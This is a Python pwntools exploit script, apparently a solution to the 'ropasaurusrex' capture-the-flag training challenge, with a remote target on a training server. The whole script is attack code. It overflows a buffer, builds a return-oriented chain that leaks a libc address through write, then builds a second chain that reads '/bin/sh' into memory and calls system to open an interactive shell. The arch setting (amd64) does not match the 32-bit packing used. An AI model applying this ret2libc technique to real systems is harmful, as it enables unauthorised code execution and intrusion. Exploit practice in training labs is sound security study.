from pwn import *

LIBC_PATH = "./downloads/libc-2.39.so"
LIBC = ELF(LIBC_PATH)
CHALL_PATH = "./ropasaurusrex_patched"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    c = remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)


#cyclic_payload = cyclic(0x200)

payload = b"A" * 268

# Do a write to get the address and go back to main
payload += p32(CHALL.plt["write"]) #0x08049050
payload += p32(CHALL.symbols["main"]) #fake EIP
payload += p32(1) #file descriptor
payload += p32(CHALL.got["read"])
payload += p32(4)


c.recvuntil(b"Input: ")
#c.sendline(cyclic_payload)

c.sendline(payload)

libc_leak = c.recv(4)
LIBC.address = u32(libc_leak) - LIBC.symbols["read"]
print("libc base: ", hex(LIBC.address))

ADD_ESP_12 = 0x0804901b

# New execution to put /bin/sh and call system
payload = b"A" * 268
payload += p32(LIBC.symbols["read"])
payload += p32(ADD_ESP_12)
#payload += p32(next(LIBC.search(b"/bin/sh\x00")))  # /bin/sh
payload += p32(0) #file descriptor
payload += p32(0x804c300)
payload += p32(7)

payload += p32(LIBC.symbols["system"])
payload += p32(0xdeadbeef)
payload += p32(0x804c300)

c.recvuntil(b"Input: ")
c.sendline(payload)
c.send(b"/bin/sh")

c.interactive()